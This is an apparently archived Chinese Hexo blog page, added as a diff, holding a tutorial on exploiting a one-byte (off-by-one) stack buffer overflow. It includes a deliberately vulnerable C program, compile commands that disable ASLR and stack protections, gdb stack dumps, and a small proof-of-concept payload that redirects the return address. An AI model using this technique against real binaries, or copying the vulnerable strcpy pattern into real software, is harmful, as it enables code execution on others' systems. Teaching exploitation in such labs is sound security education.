@@ -1,0 +1,269 @@
+<!DOCTYPE HTML>
+<html class="no-js" lang="zh-CN">
+<!--
+//                            _ooOoo_
+//                           o8888888o
+//                           88" . "88
+//                           (| -_- |)
+//                            O\ = /O
+//                        ____/`---'\____
+//                      .   ' \\| |// `.
+//                       / \\||| : |||// \
+//                     / _||||| -:- |||||- \
+//                       | | \\\ - /// | |
+//                     | \_| ''\---/'' | |
+//                      \ .-\__ `-` ___/-. /
+//                   ___`. .' /--.--\ `. . __
+//                ."" '< `.___\_<|>_/___.' >'"".
+//               | | : `- \`.;`\ _ /`;.`/ - ` : | |
+//                 \ \ `-. \_ __\ /__ _/ .-` / /
+//         ======`-.____`-.___\_____/___.-`____.-'======
+//                            `=---='
+//                 拦截插件累计拦截逗比攻击"1381438"次！
+//         .............................................
+//                  佛祖保佑             永无BUG
+//          佛曰:
+//                  写字楼里写字间，写字间里程序员；
+//                  程序人员写程序，又拿程序换酒钱。
+//                  酒醒只在网上坐，酒醉还来网下眠；
+//                  酒醉酒醒日复日，网上网下年复年。
+//                  但愿老死电脑间，不愿鞠躬老板前；
+//                  奔驰宝马贵者趣，公交自行程序员。
+//                  别人笑我忒疯癫，我笑自己命太贱；
+//                  不见满街漂亮妹，哪个归得程序员？
+-->
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!--[if lte IE 9]>
+<meta http-equiv="refresh" content="0;url=http://yoursite.com/warn.html">
+<![endif]-->
+<meta charset="utf-8">
+
+<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
+<meta http-equiv="mobile-agent" content="format=html5; url=http://yoursite.com">
+<meta name="author" content="treebacker">
+<link rel="stylesheet" href="../../../../css/SimpleStyle.min.css">
+
+<link rel="shortcut icon" href="../../../../images/favicon.png">
+
+
+<title>off_by_one利用 - Watch Security</title>
+
+<meta name="keywords" content="pwn">
+
+<meta name="description " content="">
+
+</head>
+<body>
+<div id="nav">
+    <nav class="nav-menu">
+        <a class="site-name current" href="/" title="Tree">Tree</a>
+        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>首页</span></a>
+        <a href="/archives" title="归档"><i class="fa fa-archives"></i><span>归档</span></a>
+        <a href="/tags" title="标签"><i class="fa fa-tags"></i><span>标签</span></a>
+        <!-- custom single page of menus -->
+        
+        
+        <a href="/help" title="帮助">
+            <i class="fa fa-question-circle"></i>
+            <span>帮助</span>
+        </a>
+        
+    </nav>
+</div>
+
+<div class="nav-user">
+    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
+    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
+    <a class="btn-sns-qr" href="javascript:"><i class="fa fa-telegram"></i></a>
+</div>
+
+<div id="wrapper" class="clearfix">
+    <div id="body">
+        <div class="main" id="main">
+            <div id="cover">
+    <div class="cover-img"></div>
+    <div class="cover-info">
+        
+        <h1 class="cover-siteName">Treebacker</h1>
+        <h3 class="cover-siteTitle">愿麦子和麦子长在一起，愿河流与河流流归一处。</h3>
+        <p class="cover-siteDesc">Tech and Eesay</p>
+        <div class="cover-sns">
+            
+            <div class="btn btn-github">
+                <a href="https://github.com/treebacker" target="_blank" title="github" ref="friend">
+                    <i class="fa fa-github"></i>
+                </a>
+            </div>
+            
+        </div>
+    </div>
+</div>
+            <div class="page-title">
+    <ul>
+        <li><a href="/">最新</a></li>
+        
+            
+                <li class="active">
+                    <a href="/categories/tech-notes" data-name="技术">技术</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/essays" data-name="随笔">随笔</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/cdcitizen-of-the-sun" data-name="海子">海子</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/others" data-name="其他">其他</a>
+                </li>
+            
+        
+        <li class="page-search">
+    <form id="search" class="search-form">
+        <label for="s" class="sr-only">请输入关键字</label>
+        <input class="search-field" type="text" name="s" placeholder="请输入关键字">
+        <button type="submit" class="search-form-submit" title="搜索"><i class="fa fa-search"></i></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="请输入关键词...">
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(无标题)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '../../../../content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+</li>
+
+    </ul>
+</div>
+<div class="main-inner">
+    <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+        <div class="post-header">
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="" target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar">
+                </a>
+                <p><span class="label">作者</span>
+                    <a href="" target="_blank">Treebacker</a>
+                    <span title="最后编辑于2019-04-03">2019-04-03</span>
+                </p>
+                <p></p>
+            </div>
+            <h2 class="post-title">off_by_one利用</h2>
+            <div class="post-meta">
+                本文总共8867个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
+            </div>
+        </div>
+        <div class="post-content markdown-body">
+            <h2 id="什么是大小差一漏洞（off-by-one"><a href="#什么是大小差一漏洞（off-by-one" class="headerlink" title="什么是大小差一漏洞（off_by_one)"></a>什么是大小差一漏洞（off_by_one)</h2><pre><code>就是我们输入的字符串长度等于缓冲区的长度。
+
+这种情况下，我们只能够溢出一个字节（就是字符串结束标志\x00），根据栈的布置，这个溢出的一字节会覆盖ebp的最低位为\x00，仅仅这一个字节就可能为我们利用来执行任意代码。
+</code></pre><h2 id="漏洞利用原理"><a href="#漏洞利用原理" class="headerlink" title="漏洞利用原理"></a>漏洞利用原理</h2><pre><code>我们构造一个实际的漏洞环境。代码如下：
+</code></pre><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span> *arg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bar</span><span class="params">(<span class="keyword">char</span> *arg)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	bar(arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bar</span><span class="params">(<span class="keyword">char</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">256</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(buf, arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) &gt; <span class="number">256</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">"too long!!!\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	foo(argv[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="编译链接："><a href="#编译链接：" class="headerlink" title="编译链接："></a>编译链接：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">$gcc -fno-stack-protector -z execstack -mpreferred-stack-boundary=2 -o vuln vuln.c</span><br></pre></td></tr></table></figure>
+<h4 id="反编译一下每个函数的汇编代码"><a href="#反编译一下每个函数的汇编代码" class="headerlink" title="反编译一下每个函数的汇编代码"></a>反编译一下每个函数的汇编代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function bar:</span><br><span class="line">   0x08048490 &lt;+0&gt;:	push   ebp</span><br><span class="line">   0x08048491 &lt;+1&gt;:	mov    ebp,esp</span><br><span class="line">   0x08048493 &lt;+3&gt;:	sub    esp,0x108</span><br><span class="line">=&gt; 0x08048499 &lt;+9&gt;:	mov    eax,DWORD PTR [ebp+0x8]</span><br><span class="line">   0x0804849c &lt;+12&gt;:	mov    DWORD PTR [esp+0x4],eax</span><br><span class="line">   0x080484a0 &lt;+16&gt;:	lea    eax,[ebp-0x100]</span><br><span class="line">   0x080484a6 &lt;+22&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0x080484a9 &lt;+25&gt;:	call   0x8048330 &lt;strcpy@plt&gt;</span><br><span class="line">   0x080484ae &lt;+30&gt;:	leave  </span><br><span class="line">   0x080484af &lt;+31&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">main:</span><br><span class="line">	Dump of assembler code for function main:</span><br><span class="line">   0x080484b0 &lt;+0&gt;:	push   ebp</span><br><span class="line">   0x080484b1 &lt;+1&gt;:	mov    ebp,esp</span><br><span class="line">   0x080484b3 &lt;+3&gt;:	sub    esp,0x4</span><br><span class="line">   0x080484b6 &lt;+6&gt;:	mov    eax,DWORD PTR [ebp+0xc]</span><br><span class="line">   0x080484b9 &lt;+9&gt;:	add    eax,0x4</span><br><span class="line">   0x080484bc &lt;+12&gt;:	mov    eax,DWORD PTR [eax]</span><br><span class="line">   0x080484be &lt;+14&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0x080484c1 &lt;+17&gt;:	call   0x8048360 &lt;strlen@plt&gt;</span><br><span class="line">   0x080484c6 &lt;+22&gt;:	cmp    eax,0x100</span><br><span class="line">   0x080484cb &lt;+27&gt;:	jbe    0x80484e0 &lt;main+48&gt;</span><br><span class="line">   0x080484cd &lt;+29&gt;:	mov    DWORD PTR [esp],0x8048590</span><br><span class="line">   0x080484d4 &lt;+36&gt;:	call   0x8048340 &lt;puts@plt&gt;</span><br><span class="line">   0x080484d9 &lt;+41&gt;:	mov    eax,0xffffffff</span><br><span class="line">   0x080484de &lt;+46&gt;:	jmp    0x80484f5 &lt;main+69&gt;</span><br><span class="line">   0x080484e0 &lt;+48&gt;:	mov    eax,DWORD PTR [ebp+0xc]</span><br><span class="line">   0x080484e3 &lt;+51&gt;:	add    eax,0x4</span><br><span class="line">   0x080484e6 &lt;+54&gt;:	mov    eax,DWORD PTR [eax]</span><br><span class="line">   0x080484e8 &lt;+56&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0x080484eb &lt;+59&gt;:	call   0x804847d &lt;foo&gt;</span><br><span class="line">   0x080484f0 &lt;+64&gt;:	mov    eax,0x0</span><br><span class="line">   0x080484f5 &lt;+69&gt;:	leave  </span><br><span class="line">   0x080484f6 &lt;+70&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br><span class="line">foo:</span><br><span class="line">	Dump of assembler code for function foo:</span><br><span class="line">   0x0804847d &lt;+0&gt;:	push   ebp</span><br><span class="line">   0x0804847e &lt;+1&gt;:	mov    ebp,esp</span><br><span class="line">   0x08048480 &lt;+3&gt;:	sub    esp,0x4</span><br><span class="line">   0x08048483 &lt;+6&gt;:	mov    eax,DWORD PTR [ebp+0x8]</span><br><span class="line">   0x08048486 &lt;+9&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0x08048489 &lt;+12&gt;:	call   0x8048490 &lt;bar&gt;</span><br><span class="line">   0x0804848e &lt;+17&gt;:	leave  </span><br><span class="line">   0x0804848f &lt;+18&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br><span class="line">bar:</span><br><span class="line">Dump of assembler code for function bar:</span><br><span class="line">   0x08048490 &lt;+0&gt;:	push   ebp</span><br><span class="line">   0x08048491 &lt;+1&gt;:	mov    ebp,esp</span><br><span class="line">   0x08048493 &lt;+3&gt;:	sub    esp,0x108</span><br><span class="line">   0x08048499 &lt;+9&gt;:	mov    eax,DWORD PTR [ebp+0x8]</span><br><span class="line">   0x0804849c &lt;+12&gt;:	mov    DWORD PTR [esp+0x4],eax</span><br><span class="line">   0x080484a0 &lt;+16&gt;:	lea    eax,[ebp-0x100]</span><br><span class="line">   0x080484a6 &lt;+22&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0x080484a9 &lt;+25&gt;:	call   0x8048330 &lt;strcpy@plt&gt;</span><br><span class="line">=&gt; 0x080484ae &lt;+30&gt;:	leave  </span><br><span class="line">   0x080484af &lt;+31&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+<p>执行完strcpy函数后的栈空间的分布如下图</p>
+<p><img src="F:\blog\source\_posts\off-by-one利用\me_stack.png" alt=""></p>
+<p>可以看到，ebp就在我们的缓冲区buf后面，如果输入的长度与缓冲区长度一致，就会发生一个字节的覆写(0x00)。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">`0000| 0xffffcdc8 --&gt; 0xffffcdd0 (&apos;A&apos; &lt;repeats 200 times&gt;...)</span><br><span class="line">0004| 0xffffcdcc --&gt; 0xffffd19e (&apos;A&apos; &lt;repeats 200 times&gt;...)</span><br><span class="line">0008| 0xffffcdd0 (&apos;A&apos; &lt;repeats 200 times&gt;...)</span><br><span class="line">0012| 0xffffcdd4 (&apos;A&apos; &lt;repeats 200 times&gt;...)</span><br><span class="line">0016| 0xffffcdd8 (&apos;A&apos; &lt;repeats 200 times&gt;...)</span><br><span class="line">0020| 0xffffcddc (&apos;A&apos; &lt;repeats 200 times&gt;...)</span><br><span class="line">0024| 0xffffcde0 (&apos;A&apos; &lt;repeats 200 times&gt;...)</span><br><span class="line">0028| 0xffffcde4 (&apos;A&apos; &lt;repeats 200 times&gt;...)</span><br><span class="line">0032| 0xffffcde8 (&apos;A&apos; &lt;repeats 200 times&gt;...)</span><br><span class="line">0036| 0xffffcdec (&apos;A&apos; &lt;repeats 200 times&gt;...)</span><br><span class="line">0040| 0xffffcdf0 (&apos;A&apos; &lt;repeats 200 times&gt;...)</span><br><span class="line">0044| 0xffffcdf4 (&apos;A&apos; &lt;repeats 200 times&gt;...)</span><br><span class="line">0048| 0xffffcdf8 (&apos;A&apos; &lt;repeats 200 times&gt;...)</span><br><span class="line">0052| 0xffffcdfc (&apos;A&apos; &lt;repeats 200 times&gt;...)</span><br><span class="line">0056| 0xffffce00 (&apos;A&apos; &lt;repeats 200 times&gt;...)</span><br><span class="line">0060| 0xffffce04 (&apos;A&apos; &lt;repeats 200 times&gt;...)</span><br><span class="line">0064| 0xffffce08 (&apos;A&apos; &lt;repeats 200 times&gt;)</span><br><span class="line">0068| 0xffffce0c (&apos;A&apos; &lt;repeats 196 times&gt;)</span><br><span class="line">0072| 0xffffce10 (&apos;A&apos; &lt;repeats 192 times&gt;)</span><br><span class="line">0076| 0xffffce14 (&apos;A&apos; &lt;repeats 188 times&gt;)</span><br><span class="line">0080| 0xffffce18 (&apos;A&apos; &lt;repeats 184 times&gt;)</span><br><span class="line">0084| 0xffffce1c (&apos;A&apos; &lt;repeats 180 times&gt;)</span><br><span class="line">0088| 0xffffce20 (&apos;A&apos; &lt;repeats 176 times&gt;)</span><br><span class="line">0092| 0xffffce24 (&apos;A&apos; &lt;repeats 172 times&gt;)</span><br><span class="line">0096| 0xffffce28 (&apos;A&apos; &lt;repeats 168 times&gt;)</span><br><span class="line">0100| 0xffffce2c (&apos;A&apos; &lt;repeats 164 times&gt;)</span><br><span class="line">0104| 0xffffce30 (&apos;A&apos; &lt;repeats 160 times&gt;)</span><br><span class="line">0108| 0xffffce34 (&apos;A&apos; &lt;repeats 156 times&gt;)</span><br><span class="line">0112| 0xffffce38 (&apos;A&apos; &lt;repeats 152 times&gt;)</span><br><span class="line">0116| 0xffffce3c (&apos;A&apos; &lt;repeats 148 times&gt;)</span><br><span class="line">0120| 0xffffce40 (&apos;A&apos; &lt;repeats 144 times&gt;)</span><br><span class="line">0124| 0xffffce44 (&apos;A&apos; &lt;repeats 140 times&gt;)</span><br><span class="line">0128| 0xffffce48 (&apos;A&apos; &lt;repeats 136 times&gt;)</span><br><span class="line">0132| 0xffffce4c (&apos;A&apos; &lt;repeats 132 times&gt;)</span><br><span class="line">0136| 0xffffce50 (&apos;A&apos; &lt;repeats 128 times&gt;)</span><br><span class="line">0140| 0xffffce54 (&apos;A&apos; &lt;repeats 124 times&gt;)</span><br><span class="line">0144| 0xffffce58 (&apos;A&apos; &lt;repeats 120 times&gt;)</span><br><span class="line">0148| 0xffffce5c (&apos;A&apos; &lt;repeats 116 times&gt;)</span><br><span class="line">0152| 0xffffce60 (&apos;A&apos; &lt;repeats 112 times&gt;)</span><br><span class="line">0156| 0xffffce64 (&apos;A&apos; &lt;repeats 108 times&gt;)</span><br><span class="line">0160| 0xffffce68 (&apos;A&apos; &lt;repeats 104 times&gt;)</span><br><span class="line">0164| 0xffffce6c (&apos;A&apos; &lt;repeats 100 times&gt;)</span><br><span class="line">0168| 0xffffce70 (&apos;A&apos; &lt;repeats 96 times&gt;)</span><br><span class="line">0172| 0xffffce74 (&apos;A&apos; &lt;repeats 92 times&gt;)</span><br><span class="line">0176| 0xffffce78 (&apos;A&apos; &lt;repeats 88 times&gt;)</span><br><span class="line">0180| 0xffffce7c (&apos;A&apos; &lt;repeats 84 times&gt;)</span><br><span class="line">0184| 0xffffce80 (&apos;A&apos; &lt;repeats 80 times&gt;)</span><br><span class="line">0188| 0xffffce84 (&apos;A&apos; &lt;repeats 76 times&gt;)</span><br><span class="line">0192| 0xffffce88 (&apos;A&apos; &lt;repeats 72 times&gt;)</span><br><span class="line">0196| 0xffffce8c (&apos;A&apos; &lt;repeats 68 times&gt;)</span><br><span class="line">0200| 0xffffce90 (&apos;A&apos; &lt;repeats 64 times&gt;)</span><br><span class="line">0204| 0xffffce94 (&apos;A&apos; &lt;repeats 60 times&gt;)</span><br><span class="line">0208| 0xffffce98 (&apos;A&apos; &lt;repeats 56 times&gt;)</span><br><span class="line">0212| 0xffffce9c (&apos;A&apos; &lt;repeats 52 times&gt;)</span><br><span class="line">0216| 0xffffcea0 (&apos;A&apos; &lt;repeats 48 times&gt;)</span><br><span class="line">0220| 0xffffcea4 (&apos;A&apos; &lt;repeats 44 times&gt;)</span><br><span class="line">0224| 0xffffcea8 (&apos;A&apos; &lt;repeats 40 times&gt;)</span><br><span class="line">0228| 0xffffceac (&apos;A&apos; &lt;repeats 36 times&gt;)</span><br><span class="line">0232| 0xffffceb0 (&apos;A&apos; &lt;repeats 32 times&gt;)</span><br><span class="line">0236| 0xffffceb4 (&apos;A&apos; &lt;repeats 28 times&gt;)</span><br><span class="line">0240| 0xffffceb8 (&apos;A&apos; &lt;repeats 24 times&gt;)</span><br><span class="line">0244| 0xffffcebc (&apos;A&apos; &lt;repeats 20 times&gt;)</span><br><span class="line">0248| 0xffffcec0 (&apos;A&apos; &lt;repeats 16 times&gt;)</span><br><span class="line">0252| 0xffffcec4 (&apos;A&apos; &lt;repeats 12 times&gt;)</span><br><span class="line">0256| 0xffffcec8 (&quot;AAAAAAAA&quot;)</span><br><span class="line">0260| 0xffffcecc (&quot;AAAA&quot;)</span><br><span class="line">0264| 0xffffced0 --&gt; 0xffffce00 (&apos;A&apos; &lt;repeats 200 times&gt;...)</span><br><span class="line">0268| 0xffffced4 --&gt; 0x804848e (&lt;foo+17&gt;:	leave)</span><br></pre></td></tr></table></figure>
+<p>与预计的一样，我们虽然无法覆盖返回地址，却能覆盖ebp的低字节。</p>
+<h2 id="实现任意代码执行"><a href="#实现任意代码执行" class="headerlink" title="实现任意代码执行"></a>实现任意代码执行</h2><p>​    首先，我们需要考虑为什么这个覆盖的一字节有什么用处。</p>
+<p>​    注意到，ebp被覆盖后，指向了缓冲区。这就是突破点，首先看一下程序接下来的流程：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">在bar函数执行leave指令前：</span><br><span class="line">	EBP: 0xffffced0 --&gt; 0xffffce00 (&apos;A&apos; &lt;repeats 200 times&gt;...)</span><br><span class="line">	ESP: 0xffffcdc8 --&gt; 0xffffcdd0 (&apos;A&apos; &lt;repeats 200 times&gt;...)</span><br><span class="line"></span><br><span class="line">leave &lt;==&gt; mov esp, ebp;pop ebp;</span><br><span class="line"></span><br><span class="line">执行结束后：</span><br><span class="line">EBP: 0xffffce00 (&apos;A&apos; &lt;repeats 200 times&gt;...)</span><br><span class="line">ESP: 0xffffced4 --&gt; 0x804848e (&lt;foo+17&gt;:	leave)</span><br><span class="line"></span><br><span class="line">执行ret:</span><br><span class="line">EBP: 0xffffce00 (&apos;A&apos; &lt;repeats 200 times&gt;...)</span><br><span class="line">ESP: 0xffffced8 --&gt; 0xffffd19e (&apos;A&apos; &lt;repeats 200 times&gt;...)</span><br><span class="line"></span><br><span class="line">这时，返回到了foo函数 leave指令</span><br><span class="line">执行就会</span><br><span class="line">EBP: 0x41414141 (&apos;AAAA&apos;)</span><br><span class="line">ESP: 0xffffce04 (&apos;A&apos; &lt;repeats 200 times&gt;...)</span><br><span class="line">使得esp指向了我们覆盖的ebp + 4的位置，也就是接下来ret的返回地址。</span><br></pre></td></tr></table></figure>
+<p>可以发现，我们利用bar函数里面的缓冲区溢出一个字节，就能够改变调用者的ebp从而改变调用者的返回地址，执行任意代码。</p>
+<h3 id="确定偏移"><a href="#确定偏移" class="headerlink" title="确定偏移"></a>确定偏移</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">buf_start_addr = 0xffffcdd0</span><br><span class="line">covered_ebp_addr = 0xffffce00</span><br><span class="line">our_use_addr = 0xffffce00 + 4</span><br><span class="line"></span><br><span class="line">offset =  our_use_addr - buf_start_addr</span><br></pre></td></tr></table></figure>
+<h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;A&apos; * (48 + 4)</span><br><span class="line">payload += &apos;BBBB&apos;	</span><br><span class="line">payload = payload.ljust(256, &apos;+&apos;)</span><br></pre></td></tr></table></figure>
+<h3 id="成功返回"><a href="#成功返回" class="headerlink" title="成功返回"></a>成功返回</h3><p><img src="F:\blog\source\_posts\off-by-one利用\sucess.png" alt=""></p>
+<h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><p>​    大小差一漏洞，可以利用，但是有一定的局限。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果调用者的EBP不是刚好在缓冲区上面，就不能利用。</span><br></pre></td></tr></table></figure>
+<p>​    那么什么时候，EBP不会刚好在缓冲区上面呢？</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1）缓冲区上存在别的变量</span><br><span class="line">2）内存对齐</span><br></pre></td></tr></table></figure>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​    对漏洞原理的掌握，与利用方法之间形成很好的互促。</p>
+
+        </div>
+        <div class="post-tool">
+            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
+                <i class="fa fa-thumbs-up" aria-hidden="true"></i> 打赏
+            </a>
+        </div>
+        
+        <div class="post-tags">标签：
+            
+            <a href="../../../../tags/pwn/">pwn</a>
+            
+        </div>
+        
+    </article>
+    
+    <p>本文代表个人观点，内容仅供参考。若有不恰当之处，望不吝赐教！</p>
+    
+    
+</div>
+<script src="../../../../js/busuanzi.pure.mini.js"></script>
+
+        </div><!-- end #main-->
+    </div><!-- end #body -->
+    <footer class="footer">
+    <div class="footer-inner">
+        <p>
+            <a href="/about" title="关于本站">关于本站</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <!-- 自定义链接 -->
+            <a href="/help" title="help">急救中心</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/app" title="App下载">App下载</a>
+        </p>
+        <p>
+            本站点采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>，已建立<a href="/timeline" id="siteBuildingTime"></a>天<br>
+            ©2017 基于<a href="http://hexo.io" target="_blank">Hexo</a>搭建
+            ，主题&nbsp<a href="https://github.com/tangkunyin/hexo-theme-jsimple" target="_blank">JSimple</a>
+            ，作者<a href="https://www.tangkunyin.com" target="_blank">唐先森</a>
